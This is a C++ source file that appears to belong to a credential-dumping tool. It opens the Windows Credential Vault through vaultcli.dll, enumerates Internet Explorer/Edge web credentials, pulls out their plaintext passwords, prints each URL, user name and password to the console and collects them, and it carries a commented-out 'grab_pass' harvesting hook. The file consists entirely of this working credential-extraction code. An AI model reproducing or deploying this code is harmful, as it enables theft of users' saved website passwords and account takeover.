#include "stdafx.h"
#include "SG_Browsers_Credentials.h"
#include "Utils.h"
/* ===== */
GUID Vault_WebCredential_ID =
{ 0x3CCD5499, 0x87A8, 0x4B10, 0xA2, 0x15, 0x60, 0x88, 0x88, 0xDD, 0x3B, 0x55 };

typedef DWORD(WINAPI *VaultEnumerateVaults)(DWORD dwFlags, PDWORD VaultsCount, GUID **ppVaultGuids);
typedef DWORD(WINAPI *VaultEnumerateItems)(HVAULT VaultHandle, DWORD dwFlags, PDWORD ItemsCount, PVOID *Items);
typedef DWORD(WINAPI *VaultOpenVault)(GUID *pVaultId, DWORD dwFlags, HVAULT *pVaultHandle);
typedef DWORD(WINAPI *VaultCloseVault)(HVAULT VaultHandle);
typedef DWORD(WINAPI *VaultFree)(PVOID pMemory);
typedef DWORD(WINAPI *VaultGetItemW7)(HVAULT VaultHandle, GUID *pSchemaId, PVAULT_ITEM_ELEMENT pResource, PVAULT_ITEM_ELEMENT pIdentity, HWND hwndOwner, DWORD dwFlags, PVAULT_ITEM_W7 *ppItem);
typedef DWORD(WINAPI *VaultGetItemW8)(HVAULT VaultHandle, GUID *pSchemaId, PVAULT_ITEM_ELEMENT pResource, PVAULT_ITEM_ELEMENT pIdentity, PVAULT_ITEM_ELEMENT pPackageSid, HWND hwndOwner, DWORD dwFlags, PVAULT_ITEM_W8 *ppItem);

HMODULE hVaultLib;

VaultEnumerateItems  pVaultEnumerateItems;
VaultFree            pVaultFree;
VaultGetItemW7       pVaultGetItemW7;
VaultGetItemW8       pVaultGetItemW8;
VaultOpenVault       pVaultOpenVault;
VaultCloseVault      pVaultCloseVault;
VaultEnumerateVaults pVaultEnumerateVaults;

BOOL InitVault(VOID) 
{

	BOOL bStatus = FALSE;

	hVaultLib = LoadLibrary(L"vaultcli.dll");

	if (hVaultLib != NULL) 
	{
		pVaultEnumerateItems = (VaultEnumerateItems)GetProcAddress(hVaultLib, "VaultEnumerateItems");
		pVaultEnumerateVaults = (VaultEnumerateVaults)GetProcAddress(hVaultLib, "VaultEnumerateVaults");
		pVaultFree = (VaultFree)GetProcAddress(hVaultLib, "VaultFree");
		pVaultGetItemW7 = (VaultGetItemW7)GetProcAddress(hVaultLib, "VaultGetItem");
		pVaultGetItemW8 = (VaultGetItemW8)GetProcAddress(hVaultLib, "VaultGetItem");
		pVaultOpenVault = (VaultOpenVault)GetProcAddress(hVaultLib, "VaultOpenVault");
		pVaultCloseVault = (VaultCloseVault)GetProcAddress(hVaultLib, "VaultCloseVault");

		bStatus = (pVaultEnumerateVaults != NULL)
			&& (pVaultFree != NULL)
			&& (pVaultGetItemW7 != NULL)
			&& (pVaultGetItemW8 != NULL)
			&& (pVaultOpenVault != NULL)
			&& (pVaultCloseVault != NULL)
			&& (pVaultEnumerateItems != NULL);
	}
	return bStatus;
}


BOOL GetItemW7(HVAULT hVault, PVAULT_ITEM_W7 ppItems, DWORD index, VAULT_ITEM &item) {
	DWORD dwError = ERROR_SUCCESS;

	// is this a web credential?
	if (memcmp(&Vault_WebCredential_ID, &ppItems[index].SchemaId, sizeof(GUID)) == 0)
	{
		item.Account = ppItems[index].pszCredentialFriendlyName;
		item.Url = ppItems[index].pResourceElement->ItemValue.vv.String;
		item.UserName = ppItems[index].pIdentityElement->ItemValue.vv.String;
		SF_MEMCPY(&item.LastModified, &ppItems[index].LastModified, sizeof(FILETIME));

		PVAULT_ITEM_W7 ppCredentials = NULL;
		dwError = pVaultGetItemW7(hVault,
			&ppItems[index].SchemaId, ppItems[index].pResourceElement,
			ppItems[index].pIdentityElement, NULL, 0, &ppCredentials);
		if (dwError == ERROR_SUCCESS)
		{
			item.Password = ppCredentials->pAuthenticatorElement->ItemValue.vv.String;
			pVaultFree(ppCredentials);
		}
		utils::WriteStatus(L"(IE3) Found %s, %s\n", item.UserName, item.Password);
	}
	return dwError == ERROR_SUCCESS;
}

BOOL GetItemW8(HVAULT hVault, PVAULT_ITEM_W8 ppItems, DWORD index, VAULT_ITEM &item)
{
	DWORD dwError = ERROR_SUCCESS;

	// is this a web credential?
	if (memcmp(&Vault_WebCredential_ID, &ppItems[index].SchemaId, sizeof(GUID)) == 0)
	{
		item.Account = ppItems[index].pszCredentialFriendlyName;
		item.Url = ppItems[index].pResourceElement->ItemValue.vv.String;
		item.UserName = ppItems[index].pIdentityElement->ItemValue.vv.String;
		SF_MEMCPY(&item.LastModified, &ppItems[index].LastModified, sizeof(FILETIME));

		PVAULT_ITEM_W8 ppCredentials = NULL;
		dwError = pVaultGetItemW8(hVault,
			&ppItems[index].SchemaId, ppItems[index].pResourceElement,
			ppItems[index].pIdentityElement, NULL, NULL, 0, &ppCredentials);
		if (dwError == ERROR_SUCCESS)
		{
			item.Password = ppCredentials->pAuthenticatorElement->ItemValue.vv.String;
			utils::WriteStatus(L"(GetItemW8) Found %s, %s %s\n", item.Url.c_str(), item.Password.c_str(), item.Account.c_str());

			pVaultFree(ppCredentials);
		}


	}
	return dwError == ERROR_SUCCESS;
}


void ListWebCredentials(SGBrowserCredentialsArray *credentials)
{
	DWORD dwVaults, dwError;
	HVAULT hVault;
	GUID *ppVaultGuids;
	BOOL bWin80rGreater = utils::IsOs_Win80rGreater();

	dwError = pVaultEnumerateVaults(NULL, &dwVaults, &ppVaultGuids);

	if (dwError != ERROR_SUCCESS)
	{
		//showError(dwError, L"VaultEnumerateVaults");
		return;
	}

	// for each vault found
	for (DWORD i = 0; i < dwVaults; i++)
	{
		dwError = pVaultOpenVault(&ppVaultGuids[i], 0, &hVault);
		// open it
		if (dwError == ERROR_SUCCESS)
		{
			PVOID ppItems;
			DWORD dwItems;

			// enumerate items
			dwError = pVaultEnumerateItems(hVault, VAULT_ENUMERATE_ALL_ITEMS,
				&dwItems, &ppItems);

			if (dwError == ERROR_SUCCESS)
			{
				// for each item
				for (DWORD j = 0; j < dwItems; j++)
				{
					VAULT_ITEM item;
					BOOL bResult;
					memset(&item, 0, sizeof(VAULT_ITEM));

					if (bWin80rGreater)
					{
						bResult = GetItemW8(hVault, (PVAULT_ITEM_W8)ppItems, j, item);
						SGBrowserCredentials singleItem;
						singleItem.Browser = 1;
						if (item.Password != STR_NULL)
						{
							singleItem.DateCreated = CTime(item.LastModified);
							wcscpy(singleItem.Password, item.Password.c_str());
							wcscpy(singleItem.Site, item.Url.c_str());
							wcscpy(singleItem.UserName, item.UserName.c_str());
							credentials->Add(singleItem);

						}
					}
					else
					{
						bResult = GetItemW7(hVault, (PVAULT_ITEM_W7)ppItems, j, item);
					}

					if (bResult)
					{
						// application
						pass_type_t ptype;
						ptype = pass_type_t::ie10_totden;
						/*
						if (arg)
						{
						utils::WriteStatus(L"(IE) Found %s, %s, %s\n", item.Url.c_str(), item.UserName.c_str(), item.Password.c_str());
						arg->grab_pass(ptype, item.Url.c_str(), item.UserName.c_str(), item.Password.c_str(), NULL);
						}
						*/
					}

				}
				pVaultFree(ppItems);
			}
			else
			{

				//showError(dwError, L"VaultEnumerateItems()");
			}
			pVaultCloseVault(hVault);
		}
		else
		{
			//showError(dwError, L"VaultOpenVault()");
		}
	}
}


void get_ie10_passwords(SGBrowserCredentialsArray *credentials)
{
	ConsoleSetBufferWidth(300);

	if (InitVault())
	{
		ListWebCredentials(credentials);
	}
	else
	{
		utils::WriteStatus(L"\n  Failed to initialize Vault API\n");
	}
}
